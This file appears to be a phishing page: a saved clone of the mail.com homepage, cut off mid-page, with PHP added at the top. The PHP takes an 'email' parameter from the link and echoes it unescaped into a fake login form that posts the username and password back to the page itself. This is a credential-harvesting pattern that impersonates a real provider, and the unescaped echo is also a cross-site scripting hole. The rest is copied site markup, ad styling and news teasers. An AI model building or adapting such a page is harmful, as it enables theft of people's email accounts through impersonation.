<?php 
	$email = $_GET['email'];
	if(empty($email)){
		return false;
	}
?>
<!DOCTYPE html>
<!-- saved from url=(0025)https://www.mail.com/int/ -->
<html lang="en" class="js supports flexbox flexboxlegacy no-flexboxtweener csstransforms csstransforms3d csstransitions placeholder wf-droidsans-n4-active wf-monda-n7-active wf-opensans-n4-active wf-opensans-n3-active wf-opensans-n7-active wf-droidserif-i4-active wf-monda-n4-active wf-shadowsintolight-n4-active wf-droidserif-i7-active wf-droidsans-n7-active wf-active" style=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="msapplication-tap-highlight" content="no">
<meta property="og:title" content="Free email accounts | Register today at mail.com"> <meta property="og:type" content="website"> <meta property="og:url" content="https://www.mail.com/int/"> <meta property="og:description" content="Email how it is supposed to be: ✔ Free, simple and secure ✔ Manage multiple mail accounts in one place, from any device ✔ Sign up today!"><title>Free email accounts | Register today at mail.com</title><meta name="description" content="Email how it is supposed to be: ✔ Free, simple and secure ✔ Manage multiple mail accounts in one place, from any device ✔ Sign up today!"><link rel="image_src" href="https://i0.mail.com/mcom/110/4157110,pd=2,f=meta-reference/.jpg">
  <link rel="canonical" href="https://www.mail.com/int/">
<link rel="alternate" hreflang="en" href="https://www.mail.com/int/">
<link rel="alternate" hreflang="x-default" href="https://www.mail.com/int/">
<link rel="alternate" hreflang="en-US" href="https://www.mail.com/">
<script src="files/amp4ads-host-v0.js.download"></script><script src="files/osd.js.download"></script><script src="files/pubads_impl_rendering_2019121002.js.download"></script><script type="text/javascript" async="" src="files/analytics.js.download"></script><script type="text/javascript" async="" src="files/f(6).txt"></script><script async="" type="text/javascript" src="files/gpt.js.download"></script><script async="" src="files/gtm.js.download"></script><script src="files/webfont.js.download" type="text/javascript" async=""></script><script src="files/consent.js.download"></script>
      <script>
        window.__cmp = function(action,version,callback) {
          var consent = UI_iabchain["optin"] || {};
          if(action==="getConsentData"){
            callback(consent.consent);
          } else if(action==="getVendorConsents"){
            callback(consent.vendor);
          }
        }
      </script>
      <script src="files/183560-142256617093748.js.download" async=""></script>
    <link title="Mail.com - the best personalized free web-based Email" type="application/rss+xml" rel="alternate" href="https://www.mail.com/rss/int/"><link href="https://s.uicdn.com/mailint/8.1516.0/assets/favicon.ico" rel="shortcut icon" type="image/ico"><script>
  WebFontConfig = {
    google: { families: [ 'Droid+Sans:400,700:latin', 'Monda:400,700:latin', 'Droid+Serif:400italic,700italic:latin', 'Open+Sans:300,400,700:latin', 'Shadows+Into+Light::latin' ] }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = 'https://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>
<script crossorigin="anonymous" src="files/head.min.js.download"></script><script async="async" crossorigin="anonymous" src="files/picturefill.min.js.download"></script><script src="files/adservice.js.download"></script><!-- CSS BTF --> <script> document.addEventListener('DOMContentLoaded', function() { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://s.uicdn.com/mailint/8.1516.0/assets/styles.mailcom.min.css'; l.crossOrigin = 'anonymous'; document.head.appendChild(l); l.onload = function () { document.documentElement.classList.remove('css-loading'); } }); </script><script>
	  const serviceWorkerEnabled = true;

	  if ('serviceWorker' in navigator) {
		  if (serviceWorkerEnabled) {
			  // Use the window load event to keep the page load performant
			  window.addEventListener('load', function() {
				  navigator.serviceWorker.register('/sw.js').then(function(registration) {
					  console.log('Service worker registration succeeded:', registration);
				  }).catch(function(error) {
					  console.log('Service worker registration failed:', error);
				  });
			  });
		  } else {
			  // disable sw in case of emergency
			  navigator.serviceWorker.getRegistrations().then(function(registrations) {
				  for(let registration of registrations) {
					  registration.unregister();
				  }
				  // purge cache
				  caches.keys().then(function(keyList) {
					  return Promise.all(keyList.map(function(key) {
						  return caches.delete(key);
					  }));
				  })
			  }).catch(function(err) {
				  console.log('Service Worker registration failed: ', err);
			  });
		  }
	  }
  </script>
<script src="files/potec.core.min.js.download"></script><link rel="stylesheet" href="files/css" media="all"><link rel="stylesheet" href="files/styles.mailcom.min.css" crossorigin="anonymous"><script src="files/cheet.min.js.download"></script><script src="files/f(7).txt"></script><link rel="preload" href="files/f(8).txt" as="script"><script type="text/javascript" src="files/f(8).txt"></script><link rel="preload" href="files/f(9).txt" as="script"><script type="text/javascript" src="files/f(9).txt"></script><script src="files/pubads_impl_2019121002.js.download" async=""></script><link rel="prefetch" href="https://tpc.googlesyndication.com/safeframe/1-0-37/html/container.html"><script type="text/javascript" src="files/cmTagSLIDER_INSTREAM.js.download"></script><link type="text/css" rel="stylesheet" href="files/cmOsUnit.css"><script src="files/content14_10_18m.js.download"></script><script src="files/OvaMediaPlayer.js.download"></script><style type="text/css">#_cm-css-reset {
    height: inherit;
    width: inherit;
    direction: ltr;
    text-align: left;
}

#_cm-css-reset.vpaid-player-container .vjs-tech {
    background-color: #000000;
}


#_cm-css-reset.vpaid-player-container {
    position: relative;
    z-index: 99;
}

#_cm-css-reset.vpaid-player-container video ~ iframe {
    z-index: 10;
    position: absolute;
    left: 0;
    top: 0;
}

#_cm-css-reset .vpaid-ad-controls {
    -webkit-transition: opacity 500ms ease-out;
    -moz-transition: opacity 500ms ease-out;
    -o-transition: opacity 500ms ease-out;
    transition: opacity 500ms ease-out;
    opacity: 0;
}

#_cm-css-reset.vpaid-player-container:hover .vpaid-ad-controls {
    opacity: 1;
}

#_cm-css-reset.vpaid-player-container .vpaid-ad-controls,
#_cm-css-reset.vpaid-player-container .vpaid-ad-pause {
    height: 30px;
    right: 0;
    position: absolute;
    left: 0px;
    bottom: 0;
    z-index: 1001;
    background-color: rgba(0, 0, 0, 1);
    border-top: 1px rgba(255, 255, 255, 0.7) solid;
}

#_cm-css-reset .vpaid-ad-controls.vjs-default-skin .vjs-control {
    width: 2em;
}
/*
#_cm-css-reset .vpaid-ad-controls.vjs-default-skin .vjs-control:before {
    line-height: 2;
    font-size: 16px;
}*/

#_cm-css-reset .vpaid-ad-controls.vjs-default-skin .vjs-control.c-paused:before {
    content: "\e001";
}

#_cm-css-reset.vpaid-player-container .vpaid-ad-volume-container {
    height: 30px;
    width: 60px;
    position: relative;
    float: right;
    margin-right: 10px;
    top: 0;
    cursor: pointer;
}

#_cm-css-reset.vpaid-player-container .vpaid-ad-mute-container {
    height: 30px;
    width: 30px;
    position: relative;
    float: right;
    top: 0;
    cursor: pointer;
}

#_cm-css-reset.vpaid-player-container .vpaid-ad-volume-track {
    height: 8px;
    border: 1px #000000 solid;
    box-shadow: 0 0 5px 1px rgb(255, 255, 255);
    position: absolute;
    z-index: 0;
    right: 0;
    top: 11px;
    left: 0;
    background: rgba(51, 51, 51, 0.9)
}

#_cm-css-reset.vpaid-player-container .vpaid-ad-volume-slider {
    height: 8px;
    border: 1px #000000 solid;
    position: absolute;
    width: 40%;
    top: 11px;
    left: 0;
    background: rgba(183, 234, 187, 0.9);
    z-index: 1;
}



/*#_cm-css-reset .mpegcnv::before {
    content: "";
    position: absolute;
    
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
    z-index: 100;
}*/

#_cm-css-reset .tbl-text {
    font-family: Arial,Helvetica,sans-serif;
    white-space: nowrap;
    font-size: 11px;
    color: #fff;
    left: 10px;
    top: 4px;
    position: absolute;
    font-weight: bold;
    z-index: 1001;
}

#_cm-css-reset .mc-video {
    z-index: 101;
}

#_cm-css-reset .vpaid-handler {
    z-index: 1000;
    height: 100%;
    width: 100%;
}


#_cm-css-reset .speaker {
    position: absolute;
    width: 46px;
    height: 46px;
    bottom: -3px;
    right: -5px;
    z-index: 1001;
    background-image: url('https://vidstat.taboola.com/player-assets/mob-vol-on.svg'); 
}
#_cm-css-reset .speaker.mute {
    background-image: url('https://vidstat.taboola.com/player-assets/mob-vol-off.svg'); 
}

#_cm-css-reset .hide {
    display: none
}


#_cm-css-reset .mc-loud-video{
    position:absolute;
    pointer-events: none;
}
#_cm-css-reset .mc-loud-video::-webkit-media-controls-panel {
  display: none!important;
  -webkit-appearance: none;
}

/* Old shadow dom for play button */

#_cm-css-reset .mc-loud-video::--webkit-media-controls-play-button {
  display: none!important;
  -webkit-appearance: none;
}

/* New shadow dom for play button */

/* This one works */

#_cm-css-reset .mc-loud-video::-webkit-media-controls-start-playback-button {
  display: none!important;
  -webkit-appearance: none;
}

#_cm-css-reset .mc-loud-video::-webkit-media-controls {
  display:none !important;
}
#_cm-css-reset .mc-loud-video::-webkit-media-controls-enclosure {
  display:none !important;
}



#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls.show{
    display: block;
    margin: 0;
    padding: 0;
    position: initial;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls.show *{
    position: absolute !important;
    display: block;
    margin: 0;
    padding: 0;
    background-color: transparent;
} 

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls {
    width: 100%;
    height: 100%;
    z-index: 1000;
    left: 0;
    bottom: -32px;
    -webkit-transition: bottom 0.35s ease-in-out;
    -moz-transition: bottom 0.35s ease-in-out;
    -o-transition: bottom 0.35s ease-in-out;
    transition: bottom 0.35s ease-in-out;
}


#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .control {
    z-index: 100;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .interactive {
    pointer-events: all;
    cursor: pointer;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls.hide,
#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .hide {
    display: none;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls.show,
#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .show {
    display: block;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_progressbar_area {
    width: 100%;
    height: 5px;
    bottom: 0%;
    cursor: default;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_progressbar_area .cm_video_controls_progressbar {
    height: 100%;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_progressbar_area .cm_video_controls_progressbar_bg {
    width: 100%;
    height: 100%;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .white_bg {
    background: rgba(255,255,255,0.3);
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .blue_bg {
    background: rgba(21,75,145,1);
    -webkit-transition : width 0.5s ease;
    -moz-transition : width 0.5s ease;
    -o-transition : width 0.5s ease;
    transition : width 0.5s ease;
    width: 0%;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .blue_bg.init_bg {
    -webkit-transition : none;
    -moz-transition : none;
    -o-transition : none;
    transition : none;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls {
    width: 100%;
    height: 27px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_main_area .play_pause {
    top: 3px;
    left: 5px;
    width: 20px;
    height: 20px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_main_area .play_pause .pause {
    width: 40px;
    height: 27px;
    top: -7px;
    left: -8px;
    background-image: url('https://vidstat.taboola.com/player-assets/pause2.svg');
    background-size: 36px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_main_area .play_pause .play {
    border-top: 5px solid transparent;
    border-left: 10px solid #fff;
    border-bottom: 5px solid transparent;
    left: 6px;
    top: 5px;
    z-index: 102;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_main_area .title {
    top: 7px;
    left: 30px;
    width: 140px;
    text-align: left;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .cm_video_controls_main_area .timer {
    top: 6px;
    right: 110px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .text {
    color: white;
    font-size: 13px;
    font-weight: bold;
    font-family: Arial,Helvetica,sans-serif;
    top: 10px;
    left: 28px;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    cursor: default;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .text.opt-out-hidden {
    left: 13px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls {
    width: 100%;
    height: 100%;
    right: 0px;
    bottom: 0;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_mute {
    width: 35px;
    height: 27px;
    right: 8px;
    bottom: 5px;
    background-size: 44px;
    box-sizing: content-box;
    background-position-y: center;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_mute.display_mute {
    background-image: url('https://vidstat.taboola.com/player-assets/desk_muted2.svg');
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_mute.display_unmute {
    background-image: url('https://vidstat.taboola.com/player-assets/desk_playing2.svg');
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .video-controls-scroller-area {
    width: 80px;
    height: 100%;
    right: 5px;
    top: 0%;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .playerSaveButton {
    position: absolute;
    border: 1px solid #fff;
    border-radius: 9px;
    width: 50px;
    height: 24px;
    top: 20%;
    left: 0;
    font-size: 14px;
    color: #fff;
    text-align: center;
    line-height: 24px;
    cursor: pointer;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls_mobile {
    width: 100%; 
    height: 100%; 
    top: 0; 
    left: 0; 
    pointer-events: none; 
    z-index: 1001;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area {
    pointer-events: none;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_playpause.hide {
    display: none;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_playpause.show {
    display: block;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_playpause {
    bottom: 28px;
    left: 5px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_playpause .pause {
    width: 40px;
    height: 27px;
    top: -10px;
    left: -8px;
    background-image: url(https://vidstat.taboola.com/player-assets/pause2.svg);
    background-size: 40px;
}

#_cm-css-reset ._cm-video-ad.vpaid-player-container .video_controls .video_controls_main_area .cm_video_controls_playpause .play {
    border-top: 6px solid transparent;
    border-left: 10px solid #fff;
    border-bottom: 6px solid transparent;
    left: 7px;
    top: 3px;
    z-index: 102;
}

#_cm-css-reset .mc-play {
    width: 0;
    height: 0;
    border-top: 7px solid transparent;
    border-left: 9px solid #fff;
    border-bottom: 7px solid transparent;
    left: 14px;
    position: absolute;
    bottom: 10px;
    z-index: 1001;
}

#_cm-css-reset .mc-pause {
    display: block;
    width: 42px;
    height: 42px;
    left: -4px;
    position: absolute;
    bottom: -2px;
    z-index: 1001;
    background-image: url('https://vidstat.taboola.com/player-assets/mob-pause.svg');
}

#_cm-css-reset .mc-pause.hide, #_cm-css-reset .mc-play.hide {
    display: none;
}

#_cm-css-reset .mc-pause.show, #_cm-css-reset .mc-play.show {
    display: block;
}


#_cm-css-reset .mc-progressbar_area {
    width: 100%;
    height: 5px;
    bottom: 0%;
    position: absolute;
    z-index: 9999;
}

#_cm-css-reset .mc-progressbar_area .mc-progressbar_bg.white_bg {
    background: rgba(255,255,255,0.3);
    width: 100%;
    height: 100%;
}

#_cm-css-reset .mc-progressbar_area .mc-progressbar_bg.blue_bg {
    background: rgba(21,75,145,1);
    -webkit-transition : width 0.5s ease;
    -moz-transition : width 0.5s ease;
    -o-transition : width 0.5s ease;
    transition : width 0.5s ease;
    position: absolute;
    bottom: 0%;
    height: 100%;
}

#_cm-css-reset .mc-progressbar_area .mc-progressbar_bg.blue_bg.init_bg {
    -webkit-transition : none;
    -moz-transition : none;
    -o-transition : none;
    transition : none;
}

#_cm-css-reset > .multi-vpaids {
    height: 0px;
}






#_cm-css-reset *::-webkit-media-controls-panel {
  display: none!important;
  -webkit-appearance: none;
}

/* Old shadow dom for play button */

#_cm-css-reset *::-webkit-media-controls-play-button {
  display: none!important;
  -webkit-appearance: none;
}

/* New shadow dom for play button */

/* This one works! */

#_cm-css-reset *::-webkit-media-controls-start-playback-button {
  display: none!important;
  -webkit-appearance: none;
}

#_cm-css-reset .cm-ad-player {
    cursor: pointer; 
    position: absolute; 
    left: 0px; 
    top: 0px; 
    z-index: 0;
}

#_cm-css-reset .cm-ad-player-active {
    visibility: visible;
}

#_cm-css-reset ._cm-ad-feed-manager ._cm-ad {
    display: block !important;
    visibility: hidden !important;
}

#_cm-css-reset ._cm-ad-choices-player {
    position: absolute;
    top: 16px;
    left: 13px;
}

#_cm-css-reset ._cm-ad-choices-player-anchor {
    display: inline-block;
    opacity: 0.5;
    vertical-align: middle;
}

#_cm-css-reset .interactive-video {
    position: absolute;
    z-index: 999 !important;
    cursor: pointer;
    transition: visibility 0.2s, opacity 0.5s linear;
    display: initial !important;
    opacity: 0.8;
    font-size: .875rem;
    padding-left: .75rem;
    padding-right: .75rem;
    padding-top: .25rem;
    padding-bottom: .25rem;
    font-weight: 600;
    border-radius: 9999px;
    font-size: 3.5vmin;
    text-shadow: 1px 1px black;
    font-family: Impact, Charcoal, sans-serif !important;
    letter-spacing: 0.2px;
}

#_cm-css-reset .interactive-video-lbls {
    font-family: Impact, Charcoal, sans-serif !important;
    letter-spacing: 0.2px;
}

#_cm-css-reset .interactive-video.center {
    position: relative;
}

#_cm-css-reset .interactive-video.hide {
    opacity: 0;
    visibility: hidden;
}

#_cm-css-reset .interactive-video-wrapper {
    position: absolute;
    width: 100%;
    text-align: center;
}

#_cm-css-reset .interactive-video-wrapper.hide {
    opacity: 0;
    visibility: hidden;
}

#_cm-css-reset .interactive-video.show {
    opacity: 1;
    visibility: visible;
}

#_cm-css-reset .interactive-video-effect {
    -webkit-transition : width 0s ease;
    -moz-transition : width 0s ease;
    -o-transition : width 0s ease;
    transition : width 0s ease;
    height: 1px;
    background-color: white;
    pointer-events: none;
}

#_cm-css-reset .interactive-video-effect-wrapper {
    padding-left: .75rem;
}

.hide{display: none;}

@media only screen and (max-width : 768px) {
    #_cm-css-reset .interactive-video {
        font-size: 3vmin;
    }
}

#_cm-css-reset .cm-vpaid-iframe {
    position: absolute;
    left: 0px;
    top: 0px;
    margin: 0px !important;
    padding: 0px;
    border: none;
    width: 100%;
    height: 100%;
    z-index: 1;
}</style></head>
<body class="homepage mailcom region-INT language-en">
<div id="outermost">
  <div id="container">
    
    <div class="mod mod-header" data-init="true">
    <div class="login-layer open">
    <div class="layer-box">
      <div class="welcome-box" data-style="background-image:url(https://i0.mail.com/mcom/438/3733438,pd=2/.jpg)" style="background-image: url(&quot;https://i0.mail.com/mcom/438/3733438,pd=2/.jpg&quot;);">
  <div class="headline">Welcome to mail.com</div>
  <p>Log in and enjoy your email. It is our pleasure to provide you a mailbox customized to your needs.</p></div><div class="login-box">
        <div class="headline">Login<span class="login-ssl"></span></div>
        <a class="premium-login" href="" target="_top">Premium Login</a><form action="" method="post" id="login-form" class="mod mod-loginform" data-init="true">

  <div class="login-input-wrapper hide alert1">
    <p>Logging in</p>
  </div>
  <div class="login-input-wrapper">
    <label for="login-email">Email</label>
    <input id="email" name="username" class="login-input js-hide-label" type="text" value="<?php echo $email; ?>" placeholder="Email">
  </div>
  <div class="login-input-wrapper">
    <label for="login-password">Password</label>
    <input id="password" class="login-input js-hide-label" type="password" name="password" placeholder="Password">
  </div>

  <button type="submit" class="btn btn-block login-submit" id="signin"><span>Log in</span>
  </button>
  </form>
<a class="cannot-login" href="" target="_top">Can't access your account?</a><a class="keep-login" href="" target="_top">Keep me logged in!</a></div>
      <div class="mobile-signup">
        <a class="btn button-signup" href="" target="_top"><span>Sign up</span></a></div>
      <a href="" class="close"></a>
    </div>
  </div>
<header class="header">
      <div class="header-bar">
        <a class="logo-link" href="https://www.mail.com/int/#.1258-header-logo1-1" target="_top"></a><a href="https://www.mail.com/int/#footerNav" class="nav-button nav-menu"><span></span></a>
  <div class="mod mod-navigation" data-init="true">
    <nav class="nav">
      <span class="offcanvas-item offcanvas-home"></span>
      <ul class="nav-bar-desktop">
  <li>
      <a href="https://www.mail.com/mail/#.1258-header-nav1-1" target="_top">Email</a></li>
  <li>
      <a href="https://www.mail.com/int/news/#.1258-header-nav1-2" target="_top">News</a></li>
  <li>
      <a href="https://www.mail.com/tools/#.1258-header-nav1-3" target="_top">Tools</a></li>
  <li><a href="https://www.mail.com/int/#footerNav" class="more js-more">More</a></li>
</ul>
<div class="more-nav-layer">
  <ul class="nav-list">
    <li class="nav-item has-subnav" data-navgroup="Email">
        <a href="https://www.mail.com/mail/#.1258-header-nav1-4" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg"><span>Email</span>
    </a><ul class="subnav-list">
      <li class="subnav-item">
          <a href="https://www.mail.com/mail/#.1258-header-subnav1-1" target="_top">Features</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/premiumlogin/#.1258-header-subnav1-2" target="_top">Premium Login</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/toolbar/chrome/#.1258-header-subnav1-3" target="_top">MailCheck</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/email/#.1258-header-subnav1-4" target="_top">Email Domains</a></li>
      </ul>
  </li>
    <li class="nav-item has-subnav" data-navgroup="News">
        <a href="https://www.mail.com/int/news/#.1258-header-nav1-5" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(1)"><span>News</span>
    </a><ul class="subnav-list">
      <li class="subnav-item">
          <a href="https://www.mail.com/int/news/#.1258-header-subnav2-1" target="_top">News</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/int/entertainment/#.1258-header-subnav2-2" target="_top">Entertainment</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/int/sports/#.1258-header-subnav2-3" target="_top">Sports</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/int/scitech/#.1258-header-subnav2-4" target="_top">Science &amp; Technology</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/int/business/#.1258-header-subnav2-5" target="_top">Business</a></li>
      </ul>
  </li>
    <li class="nav-item has-subnav" data-navgroup="Tools">
        <a href="https://www.mail.com/tools/#.1258-header-nav1-6" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(2)"><span>Tools</span>
    </a><ul class="subnav-list">
      <li class="subnav-item">
          <a href="https://www.mail.com/tools/iphone-app/#.1258-header-subnav3-1" target="_top">iPhone App</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/tools/android-app/#.1258-header-subnav3-2" target="_top">Android App</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/tools/ipad-app/#.1258-header-subnav3-3" target="_top">iPad App</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/toolbar/chrome/#.1258-header-subnav3-4" target="_top">MailCheck</a></li>
      <li class="subnav-item">
          <a href="https://www.mail.com/tools/firefox/#.1258-header-subnav3-5" target="_top">Browser download</a></li>
      </ul>
  </li>
    </ul>
</div><span class="offcanvas-item offcanvas-signup">
        <a href="https://signup.mail.com/#.1258-header-signup1-1" target="_top">Sign up</a></span>
      </nav>
  </div>
<a class="nav-button nav-login" href="https://www.mail.com/int/#.1258-header-navlogin1-1" target="_top"><span></span>
  </a><div class="buttons">
  <a class="btn btn-3d-blue4 button-signup" href="https://signup.mail.com/#.1258-header-signup2-1" id="signup-button" target="_top"><span>Sign up</span>
    </a><a class="btn btn-3d-blue2 button-login" id="login-button" target="_top"><span>Log in</span>
    </a></div><div class="searchbar">
  <form action="https://search.mail.com/web" method="get">
    <label for="header-search-input" class="search-default">Web Search</label>
    <input type="text" placeholder="Web Search" class="textbox js-hide-label" id="header-search-input" title="Enter searchterm here" name="q">
    <input type="hidden" name="origin" value="HP_sf_atf">
    <button type="submit" class="btn btn-3d-green button-search"><span>Search</span></button>
  </form>
</div>
</div>
      </header>
  </div>
<div id="content">
      <div class="ad-container ad-banner mod mod-inviewcheck" id="gpt-topbanner1" data-init="true" data-adcalled="true" data-google-query-id="CKCl4uOrwuYCFfnFuwgdFaUPPw">  <div id="google_ads_iframe_/6840/p6840.mail.com/HomePage_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/6840/p6840.mail.com/HomePage_0" title="3rd party ad content" name="google_ads_iframe_/6840/p6840.mail.com/HomePage_0" width="970" height="250" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" style="border: 0px; vertical-align: bottom;" data-google-container-id="3" data-load-complete="true" src="files/saved_resource(3).html"></iframe></div></div><div class="content-wrapper">
        <div class="mod-stage">
    <div class="stage-hero">
      <div class="mod mod-hero" data-interval="5" data-taboola-enabled="true" data-taboola-base-url="https://api.taboola.com/1.2/json/1and1internet-mailcom/" data-taboola-source-id="/int/" data-taboola-source-type="home" data-taboola-placement-name="homepage-carousel" data-taboola-placement-visible="true" data-init="true" data-taboola-count="6" data-component-type="carousel">
    <div class="hero-view">
  <div class="hero-slides" style="width: 8060px; transform: translate3d(-3720px, 0px, 0px);">
    <div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/news/uk/9611814-uks-johnson-unveils-legislative-plan-to-brexit-dea.html#.1258-stage-hero1-1" target="_top"><img alt="" crossorigin="anonymous" src="files/jpg(3)" srcset="https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-s/.jpg 300w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-m/.jpg 460w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-l-tall/.jpg 620w, https://i0.mail.com/mcom/458/9612458%2Cpd=2%2Cf=teaser-card-xl-tall/.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">UK's Johnson unveils legislative plan to end Brexit deadlock</div>
    </div>
  </a></div>
<div class="slide" style="width: 620px;"><a href="https://api.taboola.com/1.2/json/1and1internet-mailcom/recommendations.notify-click?app.type=desktop&amp;app.apikey=5c59a26de4617f5f8a5d93b01540559edc1a9fe2&amp;response.id=__dce68cafafc64993c155c2177a6f950b__961134a751cc9abcc100dc1e1e9bf7ca&amp;response.session=v2_d504056ea88b825b95fc6a28a5b12055_ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1_1576780143_1576780143_CIi3jgYQ49pCGP22rvvxLSABKAMwnwE4k4YMQPaWEEiz0idQ____________AVgAYAg&amp;item.id=%7E%7EV1%7E%7E-8861422484460139422%7E%7E3y52Z9_vshN2A4vi5xDLrUfKxPtncCigYcIThJ89Vi7TxvAnL2wqac4MyzR7uD46gj3kUkbS3FhelBtnsiJV6MhkDZRZzzIqDobN6rWmCPDFRR_Yhpr7D0BHAzwgARStAyK3D58jTeJsXcnbccy9IQ27SU9zliPsmLFkCUyYKGWgwdJB9gusOOKq_U9QGfcLTS8Maux2jWC1gRU3nx5A7kchcA-V62U9N99J9-T6Zbk&amp;item.type=text&amp;sig=c280a555544c1f89026425cdab8c5a6739c905149404&amp;redir=https%3A%2F%2Flp.canadianvisaexpert.com%2Fnewg_lp%2FCanada%2FLand_of_Opportunities%3Futm_lang%3Den%26af%3Dcan_2559%26utm_medium%3DNigeria_Desktop_English%26utm_subid2%3D1092963_83195250&amp;ui=ae8aa8f7-f82a-49e7-942b-d0bc3ca2f9df-tuct48d22b1" target="_blank"><img class="taboola-slide-img" src="files/http___cdn.taboola.com_libtrc_static_thumbnails_61ff59fc8a9c8834434f76d054ef0c48.jpg"><div class="slide-headline taboola-source"><p class="taboola-text"><span class="taboola-brand">Canadian Visa Expert</span><span class="taboola-sponsored">&nbsp; SPONSORED BY TABOOLA</span></p><div class="text">The government of Canada needs more workers from all over the world!</div></div></a></div>
<div class="slide" style="width: 620px;">
  <a href="https://www.mail.com/int/scitech/news/9611828-putin-trump-was-impeached-far-fetched-reasons.html#.1258-stage-hero1-3" target="_top"><img alt="Vladimir Putin" crossorigin="anonymous" src="files/vladimir-putin.jpg" srcset="https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-card-s/vladimir-putin.jpg 300w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-card-m/vladimir-putin.jpg 460w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-card-l-tall/vladimir-putin.jpg 620w, https://i0.mail.com/mcom/298/9612298%2Cpd=2%2Cf=teaser-card-xl-tall/vladimir-putin.jpg 940w" sizes="(max-width:479px) 100vw, (min-width:480px) and (max-width:767px) 460px, (min-width:768px) and (max-width:1023px) 620px, (min-width:1024px) 620px"><div class="slide-headline">
      <div class="text">Putin says Trump was impeached for 'far-fetched' reasons</div>
    </div>
  </a></div>
